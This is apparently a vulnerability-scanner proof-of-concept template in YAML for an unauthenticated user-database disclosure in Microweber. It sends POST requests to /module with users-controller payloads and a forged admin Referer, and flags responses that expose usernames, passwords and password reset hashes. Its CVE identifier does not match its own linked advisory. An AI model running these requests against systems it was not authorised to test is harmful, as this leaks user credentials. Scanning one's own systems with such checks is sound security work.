name: poc-yaml-microweber-cve-2020-13415-information-disclosure
binding: a8bd60b1-ae3e-4e4c-90da-d82ed251cc1f
manual: true
detail:
    author: Xz
    links:
        - https://rhinosecuritylabs.com/research/microweber-database-disclosure/
        - https://nvd.nist.gov/vuln/detail/CVE-2020-13405
        - https://github.com/microweber/microweber/commit/269320e0e0e06a1785e1a1556da769a34280b7e6
    vulnerability:
        id: CT-52315
        level: high
    description: MicroWeber - Unauthenticated User Database Disclosure
transport: http
set:
    refurl: request.url
payloads:
    payloads:
        p1:
            data: |
                "module=/modules/users/controller"
        p2:
            data: |
                "module=users/controller"
        p3:
            data: |
                "module=modules/users/controller"
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /module
            headers:
                Content-Type: application/x-www-form-urlencoded; charset=UTF-8
                Referer: '{{refurl}}/admin/view:modules/load_module:users'
            body: |
                {{data}}
        expression: response.status == 200 && response.body.bcontains(b"username") && response.body.bcontains(b"password") && response.body.bcontains(b"password_reset_hash") && response.body.bcontains(b"<span class=sf-dump-key>")
expression: r0()
